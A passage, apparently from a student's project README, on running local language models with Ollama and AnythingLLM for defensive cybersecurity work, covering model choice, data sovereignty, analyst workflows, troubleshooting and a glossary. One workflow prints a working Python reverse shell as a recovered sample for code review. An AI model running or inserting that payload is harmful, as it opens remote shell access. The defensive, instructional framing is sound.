| Model | Provider | Estimated Parameters | Notes |
|---|---|---|---|
| GPT-3.5 | OpenAI | ~175B | Published — the original GPT-3 architecture |
| GPT-4 | OpenAI | ~1.8T (estimated) | Widely cited as a mixture-of-experts architecture |
| GPT-4o | OpenAI | ~200B (estimated) | Optimized variant, smaller than base GPT-4 |
| Claude 3 Opus | Anthropic | ~340B (estimated) | Unconfirmed, inferred from benchmark positioning |
| Claude 3.5 Sonnet | Anthropic | ~175B (estimated) | Unconfirmed |
| Gemini 1.5 Pro | Google | ~1T (estimated) | Unconfirmed, multimodal architecture |
| Gemini 2.0 Flash | Google | ~50B (estimated) | Optimized for speed over scale |

**Local models in this deployment for comparison:**

| Model | Parameters | Size on Disk (Q4) |
|---|---|---|
| `phi4-reasoning:14b` | 14B | 11GB |
| `ALIENTELLIGENCE/cybersecuritythreatanalysisv2` | ~7B (estimated) | 4.7GB |
| `jimscard/blackhat-hacker:v2` | ~13B (estimated) | 9.2GB |
| `deepseek-r1:32b` | 32B | 19GB |
| `deepseek-coder:33b-instruct` | 33B | 18GB |
| `qwen3-coder:30b` | 30B | 18GB |
| `qwen3:32b` | 32B | 20GB |
| `llama3.1:70b-instruct-q4_K_M` | 70B | 42GB |

**What this means in practice:**

The largest local model in this library — Llama 3.1 70B — sits well below the estimated parameter counts of GPT-4, Claude 3 Opus, or Gemini 1.5 Pro. On general reasoning tasks, those commercial models will outperform a local 70B model.

However, parameter count is not the only variable. Domain-specific fine-tuning — as seen in the cybersecurity and coding models in this library — can produce output that outperforms a larger general model on the specific task it was trained for. A 7B model trained exclusively on threat intelligence data may produce more operationally useful threat analysis than a 1T general model that has to context-switch across millions of domains.

The practical conclusion: local models at current hardware limits cannot match the raw general capability of frontier commercial models. They can and do match or exceed them on specific domains — and they do so with complete data sovereignty, which for federal cybersecurity work is the deciding factor regardless of raw capability comparison.

---

## Security and Privacy Considerations

Local AI deployment is often framed as a performance or cost decision. For cybersecurity work, it is primarily a security decision. This section explains why data sovereignty matters beyond inference speed and what the real risks of cloud AI usage are in sensitive operational contexts.

---

### What Happens to Data Sent to Cloud AI Services

Every query sent to a cloud AI service — ChatGPT, Gemini, Claude, Copilot — travels across the internet to a private company's servers, is processed on hardware you do not control, and is subject to that company's data retention, usage, and disclosure policies.

For general consumer use this is an acceptable tradeoff. For cybersecurity work involving sensitive data, it is not.

**Specific risks:**

- **Data retention** — Most commercial AI providers retain query data for periods ranging from 30 days to indefinitely depending on account type and settings. Data submitted in a query may be used to improve future model versions.
- **Government data requests** — All major cloud AI providers are subject to legal process in their jurisdiction. A subpoena, National Security Letter, or equivalent legal instrument can compel disclosure of query data. The company may be prohibited from informing you this occurred.
- **Insider threat** — Data processed on third-party infrastructure is accessible to that company's employees and contractors subject to their internal access controls — controls you cannot audit or verify.
- **Third-party processing** — Some cloud AI services route queries through additional vendors for content filtering, safety review, or infrastructure purposes. Data may traverse more systems than the primary service implies.
- **Terms of service changes** — Policies that are acceptable today may change. Data already submitted under prior terms may be subject to new policies retroactively.

None of these risks are hypothetical. They are documented features of how cloud AI services operate.

---

### What Local Deployment Changes

When inference runs entirely on local hardware:

- **No data leaves the machine** — Queries, documents, and outputs never traverse a network unless you explicitly export them
- **No third-party retention** — There is no external party with access to your query history
- **No legal exposure** — A government data request served on Ollama or AnythingLLM yields nothing because no query data is stored on their servers — you are running their software locally
- **No policy risk** — Terms of service for the model runtime do not affect data you process locally
- **Auditable** — Every component of the stack (Ollama, AnythingLLM, the model weights) is open source and inspectable

---

### Practical Application to Federal Cybersecurity Work

Federal cybersecurity roles operate under explicit data handling requirements. Threat intelligence, network traffic captures, vulnerability scan results, incident response artifacts, and asset inventory data all carry handling requirements that commercial cloud AI cannot meet.

The local AI infrastructure documented here is designed from the ground up around these requirements:

- **Air-gap capable** — The system operates with zero external network dependencies. It can run on a machine with no internet connection at all once models are downloaded
- **No telemetry** — Ollama does not phone home with usage data during inference
- **Classified-adjacent workflows** — While this system is not certified for classified processing, the architectural pattern — local inference, no external transmission, operator-controlled hardware — is the same pattern used in classified AI deployments

This infrastructure demonstrates not just technical capability but the security reasoning that federal employers look for in GS-11/12 candidates. The decision to run local is itself a security decision, and documenting the rationale behind it shows understanding of why data sovereignty matters in operational environments.

---

## Real-World Workflow Examples

These examples show how the infrastructure is used end-to-end on actual analytical tasks. Each follows the same pattern: open the appropriate workspace, submit the input, review the output. No cloud transmission occurs at any point.

---

### Workflow 1: CISA Alert Triage

**Workspace:** Threat Intelligence (`ALIENTELLIGENCE/cybersecuritythreatanalysisv2`)

**Scenario:** A new CISA advisory drops. The analyst needs to quickly determine whether it is relevant to the environment, what the threat actor's likely TTPs are, and what immediate mitigations apply.

**Step 1:** Open the Threat Intelligence workspace in AnythingLLM.

**Step 2:** Paste the CISA advisory text directly into the chat window. Example input:

```
CISA Alert AA25-XXX: Threat actors affiliated with [group] have been observed 
exploiting CVE-XXXX-XXXX in [affected software] versions prior to X.X. 
Exploitation enables unauthenticated remote code execution. CISA has observed 
active exploitation in the wild targeting critical infrastructure sectors.
```

**Step 3:** The model — already configured with the Threat Intelligence system prompt — immediately structures its response around:
- Threat actor TTP classification (MITRE ATT&CK mapping)
- Affected asset classes in the environment
- Exploitation likelihood assessment
- Prioritized mitigation steps

**What this demonstrates:** The system prompt eliminates the need to re-explain analytical framework at the start of every session. The model behaves as a trained threat analyst from the first token of every response.

---

### Workflow 2: Malware Code Review

**Workspace:** Code Review (`deepseek-coder:33b-instruct`)

**Scenario:** A suspicious script has been recovered from an endpoint. The analyst needs to understand what it does, identify its capabilities, and assess what damage it could cause.

**Step 1:** Open the Code Review workspace.

**Step 2:** Paste the suspicious code. Example:

```python
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.100", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
```

**Step 3:** The model identifies this as a reverse shell, explains the socket connection mechanism, identifies the hardcoded C2 IP and port, explains what `dup2` does in this context, and assesses the capability and likely intent.

**What this demonstrates:** Sensitive code — potentially from an active incident — never leaves the local machine. A cloud-based tool would transmit this code to external servers, creating chain-of-custody and classification concerns.

---

### Workflow 3: Attack Chain Reconstruction

**Workspace:** Attack Chain (`deepseek-r1:32b`)

**Scenario:** Multiple alerts have fired over a 48-hour window. The analyst needs to determine whether these are isolated events or steps in a coordinated campaign.

**Step 1:** Open the Attack Chain workspace.

**Step 2:** Submit a timeline of events:

```
T+00:00 - Phishing email opened by user, attachment executed
T+02:15 - Unusual PowerShell execution detected on workstation
T+04:30 - LSASS memory access observed
T+06:00 - Lateral movement to file server via SMB
T+18:00 - Scheduled task created on domain controller
T+24:00 - Outbound traffic to unknown IP on port 443
T+48:00 - Large data transfer to external destination
```

**Step 3:** The R1 model works through the chain step by step — showing its reasoning at each stage — and maps the sequence to a complete attack lifecycle: initial access → execution → credential access → lateral movement → persistence → exfiltration.

**What this demonstrates:** The R1 model's chain-of-thought reasoning is visible in the output — the analyst can follow the logic and identify where the model's assessment differs from their own, rather than just receiving a black-box conclusion.

---

### Workflow 4: Red Team Surface Analysis

**Workspace:** Red Team (`jimscard/blackhat-hacker:v2`)

**Scenario:** Before a scheduled penetration test, the analyst wants an adversarial assessment of a network configuration to identify likely attack vectors.

**Step 1:** Open the Red Team workspace.

**Step 2:** Submit the configuration details (sanitized for this example):

```
Network segment: 192.168.10.0/24
Exposed services: RDP (3389), SMB (445), HTTP (80), SSH (22)
Authentication: Domain-joined, password policy minimum 8 chars
Patch status: 30 days behind current
```

**Step 3:** The model responds from an attacker's perspective — enumerating the most likely exploitation paths, prioritizing by ease of exploitation and potential impact, and identifying the configuration details that represent the greatest risk.

---

## Lessons Learned

This section documents what went wrong during the development process — the dead ends, the failed configurations, and the decisions that had to be reversed. These are as important as the successes for anyone attempting to replicate this setup.

---

### Docker Desktop: The Overhead Problem

The Docker approach seemed reasonable on paper — containerization provides isolation, portability, and a clean deployment environment. In practice, it introduced two problems that made it unsuitable for this use case.

**Problem 1: GPU passthrough friction.** Getting Docker Desktop on Windows to correctly pass GPU resources to the container required configuring the NVIDIA Container Toolkit, which is primarily designed for Linux. The Windows implementation added configuration complexity and did not reliably expose the full 16GB of VRAM to the container. In testing, the containerized Ollama instance showed lower effective VRAM utilization than the native installation on the same hardware.

**Problem 2: Performance overhead was measurable.** Every inference request passing through the container abstraction layer added latency. On a task that produced a response in 45 seconds natively, the containerized version took 60–75 seconds. For occasional use that difference is tolerable. For sustained analytical work it compounds into a significant productivity loss.

**What would make Docker viable:** A Linux host OS eliminates most of the GPU passthrough friction. If this infrastructure were deployed on a Linux server rather than a Windows workstation, Docker would be a reasonable approach. On Windows with a gaming-class GPU, it is not the right tool.

**The ngrok dependency:** The intent was to expose the local Ollama API through ngrok for remote access. This was abandoned not just because of performance issues, but because it fundamentally contradicts the data sovereignty goal. Any request routed through ngrok passes through ngrok's servers. That is not air-gapped. The approach was architecturally incompatible with the use case regardless of performance.

---

### WSL: The Abstraction Layer Problem

WSL2 runs a full Linux kernel in a lightweight virtual machine. The theory was that running Ollama in a native Linux environment would produce better performance than the Windows native installation. The theory was wrong in practice.

**Problem 1: GPU driver integration instability.** WSL2 uses a translation layer to expose the Windows NVIDIA driver to the Linux environment. This works adequately for many workloads but showed instability during sustained inference runs — specifically, the GPU would occasionally drop its context, causing inference to stall and requiring a restart of the Ollama service. This happened rarely but unpredictably, which is worse than consistent degraded performance for analytical work.

**Problem 2: The abstraction layer added latency.** The GPU access path in WSL2 is: Linux application → WSL2 kernel → Windows hypervisor → Windows NVIDIA driver → GPU. The native path is: Windows application → Windows NVIDIA driver → GPU. Every extra hop in that chain costs time. In practice, inference speeds were 10–15% lower than native on the same model.

**Problem 3: Resource allocation complexity.** WSL2 requires configuring how much system RAM is allocated to the Linux VM via `.wslconfig`. Getting this right for large model inference — where RAM requirements vary significantly between models — required constant adjustment. The native installation handles this dynamically without configuration.

**What was learned:** The assumption that "Linux is better for AI workloads" is true in server contexts where the entire OS is Linux. In a WSL environment on Windows, you get Linux's complexity without Linux's performance advantages. For a single-user Windows workstation, native installation is the correct choice.

---

### Model Library: What Got Removed and Why

The library started with 18+ models in late May 2025. The pruning process removed models for several reasons:

**Redundancy:** Multiple models covering the same capability at similar quality. When testing showed two models producing near-identical output on the same tasks, the smaller or less-capable one was removed. Disk space is finite and model switching time has a cost.

**Size/performance mismatch:** Some models were large without being proportionally better. A 20GB model that produced output equivalent to a 9GB model on relevant tasks was removed in favor of the smaller option.

**Domain mismatch:** Several general-purpose models were retained early in the process on the assumption they would cover gaps. Testing showed the domain-specific models handled security work better than the general models in almost every case. The general models that survived (Qwen3:32b) did so because they genuinely outperformed alternatives on non-specialized tasks, not because they were good enough at specialized tasks.

**Key lesson:** Start with a broader library than you need, test systematically on representative tasks, and remove anything that is not clearly the best option for at least one distinct role. A smaller, well-curated library outperforms a larger undifferentiated one.

---

### What Would Be Done Differently

**Start with native installation.** Three weeks were spent testing Docker and WSL before arriving at the conclusion that native Windows was the correct deployment. That time could have been spent on model evaluation and workflow development. The lesson is to start with the simplest approach and only add complexity when the simple approach demonstrably fails.

**Define use cases before pulling models.** The early library of 18+ models was assembled by pulling anything that seemed interesting or potentially relevant. A more disciplined approach — define the specific analytical tasks first, then identify the best model for each task — would have produced the current library faster and with less wasted storage.

**Test on real workloads immediately.** Early model testing used simple prompts to evaluate output quality. Moving to representative real-world tasks (actual CISA alerts, actual code samples, actual threat scenarios) earlier in the process would have accelerated the selection process significantly.

---

## Troubleshooting

Common errors encountered during deployment and their solutions, documented from actual experience building this infrastructure.

---

### Ollama

**`ollama: command not found` after installation**

The Ollama installer adds itself to PATH, but the change may not be reflected in an already-open terminal.

*Fix:* Close and reopen Command Prompt or PowerShell. If the problem persists, verify the installation by checking `C:\Users\[username]\AppData\Local\Programs\Ollama\` — the executable should be present. Add the directory to PATH manually if needed.

---

**Model pulls fail partway through or show connection errors**

Large model downloads (18–42GB) are vulnerable to network interruptions.

*Fix:* Re-run `ollama pull modelname:tag`. Ollama resumes incomplete downloads automatically — it does not restart from zero. Run the pull command again and it will continue from where it stopped.

---

**`ollama run` produces output but GPU utilization stays at 0%**

The model is running on CPU only. This produces significantly slower inference and means VRAM is not being used.

*Fix:* Verify NVIDIA drivers are current. Open Device Manager → Display Adapters → confirm the RTX 4080 is listed without warnings. Run `nvidia-smi` in Command Prompt — if this command fails, the driver is not installed correctly. Reinstall NVIDIA drivers from [nvidia.com](https://www.nvidia.com/drivers) and restart the system before retrying.

---

**Ollama crashes or stops responding during long inference runs**

Usually a thermal or power issue, not a software bug.

*Fix:* Check GPU temperature in Task Manager → Performance → GPU → Temperature. If temperature exceeds 85°C during inference, the GPU is thermal throttling. Improve case airflow or verify cooling is functioning. Also check Event Viewer → Windows Logs → System for GPU-related errors that may indicate a driver or hardware issue.

---

**`error: model requires more system memory than available`**

The model is too large for available RAM + VRAM combined.

*Fix:* Close other applications to free system RAM before running the model. For the 70B model specifically, ensure at least 48GB of system RAM is free before loading. If RAM is consistently insufficient, consider switching to a smaller quantized version of the model.

---

**Models listed in `ollama list` don't appear in AnythingLLM**

AnythingLLM caches the model list at startup and doesn't always refresh automatically.

*Fix:* In AnythingLLM Settings → AI Providers → LLM Provider, click the refresh icon next to the model dropdown. If models still don't appear, verify Ollama is running (`ollama serve` in terminal), then restart AnythingLLM completely.

---

### AnythingLLM

**AnythingLLM shows "Could not connect to Ollama" in settings**

The Ollama service is not running or the URL is incorrect.

*Fix:* Open Command Prompt and run `ollama serve`. If it returns "address already in use," Ollama is running and the issue is the URL. Confirm the Base URL in AnythingLLM settings is exactly `http://localhost:11434` — no trailing slash, no https. If Ollama is not running, it may need to be started manually: search for Ollama in the Start Menu and launch it.

---

**Workspace responses are slow even for small prompts**

The workspace is assigned a large model that requires VRAM offload.

*Fix:* Check which model is assigned to the workspace in workspace settings. If the workspace is set to `llama3.1:70b` for routine queries, switch it to `qwen3:32b` or `phi4-reasoning:14b` for faster responses. Reserve the 70B model for workspaces where its reasoning depth is genuinely needed.

---

**System prompt doesn't seem to be affecting model behavior**

The system prompt was saved but the model is not following it.

*Fix:* Verify the prompt was actually saved — open workspace settings → Prompt tab and confirm the text is present. Start a new chat rather than continuing an existing one (the system prompt applies to new chats; existing chats retain the prompt that was active when they started). If the model still ignores the prompt, check that the prompt is not excessively long — some models handle very long system prompts poorly. Trim to the essential instructions.

---

**AnythingLLM crashes when loading a large document**

Document ingestion for RAG purposes can consume significant RAM.

*Fix:* Reduce the document size before ingestion — split large PDFs into sections. Ensure at least 8GB of free system RAM before uploading documents. Close unnecessary background applications. If the crash is consistent, check the AnythingLLM logs in `%AppData%\AnythingLLM\logs\` for specific error messages.

---

## Glossary

Key terms used throughout this documentation, defined for readers without a deep technical background in AI infrastructure.

---

**Air-gap**
A security configuration where a computer or network is physically isolated from external networks — no internet connection, no wireless, no external data path of any kind. An air-gapped AI deployment runs entirely without internet access. Once models are downloaded, this system can operate fully air-gapped.

---

**AnythingLLM**
The interface layer used in this project. AnythingLLM is a desktop application that provides workspaces, document ingestion, conversation history, and system prompt management on top of a model runtime like Ollama. It is what the user interacts with; Ollama handles the actual model execution underneath.

---

**Chain-of-thought reasoning**
A model behavior where the AI works through a problem step by step before arriving at a conclusion, making its reasoning process visible. The DeepSeek R1 model in this library is specifically trained to produce chain-of-thought output. This matters in cybersecurity analysis because the reasoning path can be audited and challenged, not just the final answer.

---

**Data sovereignty**
Control over where data goes and who can access it. In federal cybersecurity, data sovereignty means sensitive information stays within controlled systems and is never transmitted to external services. Local AI deployment maintains complete data sovereignty — no data leaves the machine.

---

**Fine-tuning**
The process of taking a pre-trained model and continuing to train it on a specific dataset to improve its performance on a particular domain. The cybersecurity models in this library (ALIENTELLIGENCE, BlackHat Hacker) are fine-tuned versions of base models — they started as general models and were further trained on security-specific data.

---

**Inference**
The process of running a model to generate output. When you submit a prompt and the model produces a response, that is inference. Inference is computationally intensive and is the primary workload that drives VRAM and RAM requirements.

---

**Ollama**
The model runtime used in this project. Ollama is an open-source tool that downloads, manages, and runs large language models locally. It handles the technical complexity of loading model weights onto the GPU and exposes a simple API that other applications use to query models.

---

**Quantization**
A technique for reducing a model's size by representing its internal numbers (weights) with less precision. A full-precision model stores each weight as a 16-bit or 32-bit number. A Q4 quantized model stores each weight as a 4-bit number — roughly 4x smaller. Quantization makes large models fit on consumer hardware at the cost of some output quality. The 70B Llama model in this library uses Q4_K_M quantization to fit within available RAM.

---

**RAG (Retrieval-Augmented Generation)**
A technique where a model is given access to a document library and can retrieve relevant passages before generating a response. In AnythingLLM, RAG allows you to upload documents (threat reports, policy documents, CVE databases) and ask the model questions that draw on those specific documents rather than just its training data.

---

**System prompt**
A persistent instruction set given to a model before any user interaction begins. In AnythingLLM, each workspace has a system prompt that is automatically sent at the start of every conversation — defining the model's role, behavior, and analytical framework. The user never sees or has to re-enter the system prompt; it is built into the workspace.

---

**Tokens / tokens per second**
AI models process text as tokens — chunks of text roughly corresponding to words or word fragments. A model generating at 3–5 tokens per second produces approximately 3–5 words per second of output. Response time for a 500-word analysis at 4 tokens/second is approximately 2 minutes.

---

**VRAM (Video RAM)**
Memory on the GPU used to store model weights during inference. VRAM is faster than system RAM for GPU computations but limited in quantity — the RTX 4080 has 16GB. Models that fit entirely in VRAM run at full speed. Models that exceed VRAM capacity offload layers to system RAM, which reduces inference speed due to the data transfer required between the two memory types.

---

## Project Timeline

| Period | Milestone |
|---|---|
| May 2025 | Discovered Ollama, pulled first models out of curiosity |
| May 2025 | Library grew to 18+ models through exploratory testing |
| Summer 2025 | Tested Docker Desktop + ngrok architecture — evaluated and rejected |
| Summer 2025 | Tested WSL deployment architecture — evaluated and rejected |
| Fall 2025 | Settled on native Windows as production architecture |
| Fall 2025 | Integrated AnythingLLM as workspace interface layer |
| January 2026 | Current production library — 150GB, task-routed model collection |
| April 2026 | Production deployment running Ollama v0.21.2 and AnythingLLM v1.10.0 |
| May 2026 | Graduating FTCC — targeting GS-11/12 federal cybersecurity positions |

---

## About the Author

U.S. Army veteran (13B Field Artillery, 38B Civil Affairs) with two combat deployments to Afghanistan and eight years of residency in Okinawa, Japan. Currently completing a Systems Security & Analysis degree at Fayetteville Technical Community College with a 4.0 GPA and President's List recognition every semester. Former AI Data Analyst on the DoD Pathfinder Project (2024–2025). Preparing for CompTIA Security+ and CySA+ certification.

- GitHub: [BECKHAMW3233/CSC-113](https://github.com/BECKHAMW3233/CSC-113)
- LinkedIn: [linkedin.com/in/WilliamBeckham](https://www.linkedin.com/in/WilliamBeckham/)

---

## References

- [Ollama Documentation](https://docs.ollama.com)
- [Ollama Windows Download](https://ollama.com/download/windows)
- [AnythingLLM Desktop Download](https://anythingllm.com/desktop)
- [AnythingLLM Documentation](https://docs.anythingllm.com)
- [MITRE ATT&CK Framework](https://attack.mitre.org)
- [CISA Alerts and Advisories](https://www.cisa.gov/news-events/cybersecurity-advisories)
- [NVD CVE Database](https://nvd.nist.gov)
- [NVIDIA Driver Downloads](https://www.nvidia.com/drivers)
- [CompTIA Security+ Certification](https://www.comptia.org/certifications/security)
- [CompTIA CySA+ Certification](https://www.comptia.org/certifications/cybersecurity-analyst)
